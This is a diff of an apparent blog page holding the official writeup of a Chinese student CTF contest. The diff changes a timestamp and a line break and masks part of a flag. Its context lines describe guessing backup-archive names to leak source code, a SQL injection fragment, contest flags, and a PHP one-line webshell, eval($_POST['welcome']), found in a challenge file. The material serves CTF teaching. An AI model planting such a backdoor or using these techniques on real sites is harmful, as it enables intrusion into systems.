@@ -14,7 +14,7 @@
 <meta property="og:url" content="http://nocv.me/2018/01/01/Writeup-md/index.html">
 <meta property="og:site_name" content="Nocv blog">
 <meta property="og:description" content="0X00：写在前面的话考虑到参加这次比赛的人员总体水平，所以题出的都比较简单，但是题量相对于9月份的校赛还是比较多的。所以这次的题呢也就以web为主，算是给想入门CTF的新手们一个比较好的开始吧。平台采用的是开源的CTFD平台，赛题主要是手撸代码+虚拟容器技术。  0X01：WEB1. Check_in这题是针对小白的，本来不打算增加这么一道题，实在没办法。恩，答案就在那  fctf{96B61">
-<meta property="og:updated_time" content="2018-01-01T14:51:55.025Z">
+<meta property="og:updated_time" content="2018-01-01T14:55:05.173Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络安全技能大赛官方Writeup">
 <meta name="twitter:description" content="0X00：写在前面的话考虑到参加这次比赛的人员总体水平，所以题出的都比较简单，但是题量相对于9月份的校赛还是比较多的。所以这次的题呢也就以web为主，算是给想入门CTF的新手们一个比较好的开始吧。平台采用的是开源的CTFD平台，赛题主要是手撸代码+虚拟容器技术。  0X01：WEB1. Check_in这题是针对小白的，本来不打算增加这么一道题，实在没办法。恩，答案就在那  fctf{96B61">
@@ -217,7 +217,7 @@ union select name from flag;
 </blockquote>
 <h3 id="12-Backup"><a href="#12-Backup" class="headerlink" title="12.  Backup"></a>12.  Backup</h3><p>题目给了提示是backup。应该考查的是源码泄漏，通常在url后面输入”www.tar.gz”、”www.rar”、”www.zip”、”backup.tar.gz”、”backup.rar”、”backup.zip”等等。此题在输入www.zip的时候就已经出现了。整个源码被dump之后在所有源码里搜索危险函数如“``”、“eval()”、“system()”等等。而在这道题中，我们可以在about/show.php中的第8行找到了如下代码</p>
 <blockquote>
-<p>if(isset($_POST[‘welcome’])){eval($_POST[‘welcome’]);}<br><br>很明显是一句话木马，然后怎么得到flag就不用说了吧<br>fctf{C12D20EC<strong><strong>**</strong></strong>B8D270A99AC50E}</p>
+<p>if(isset($_POST[‘welcome’])){eval($_POST[‘welcome’]);}<br>很明显是一句话木马，然后怎么得到flag就不用说了吧<br>fctf{C12D20EC<strong><strong>**</strong></strong>B8D270A99AC50E}</p>
 </blockquote>
 <h3 id="13-File-get-contents"><a href="#13-File-get-contents" class="headerlink" title="13. File_get_contents"></a>13. File_get_contents</h3><p>这道题，出了点失误。我本来是思路是ssrf，想考察一下对PHP中file_get_contents()函数的用法。结果没成功成了文件读取了。直接读取flag文件就行。</p>
 <blockquote>
@@ -291,7 +291,7 @@ print r.text
 </blockquote>
 <h2 id="0X03：CRYPTO"><a href="#0X03：CRYPTO" class="headerlink" title="0X03：CRYPTO"></a><strong>0X03：CRYPTO</strong></h2><h3 id="1-BASE64"><a href="#1-BASE64" class="headerlink" title="1. BASE64"></a>1. BASE64</h3><p>这道题，就是BASE64，别想多，只是BASE64加密次数有点多而已。解就是了</p>
 <blockquote>
-<p>fctf{0FEA29238DC21D183E329557FFFD53D3}</p>
+<p>fctf{0FEA2923<strong><strong>**</strong></strong>E329557FFFD53D3}</p>
 </blockquote>
 <h3 id="2-crypto"><a href="#2-crypto" class="headerlink" title="2. crypto"></a>2. crypto</h3><p>这道题，凯撒加栅栏。rot13转一下就能看出flag的特性了，再用栅栏密码解一下就出来了</p>
 <blockquote>
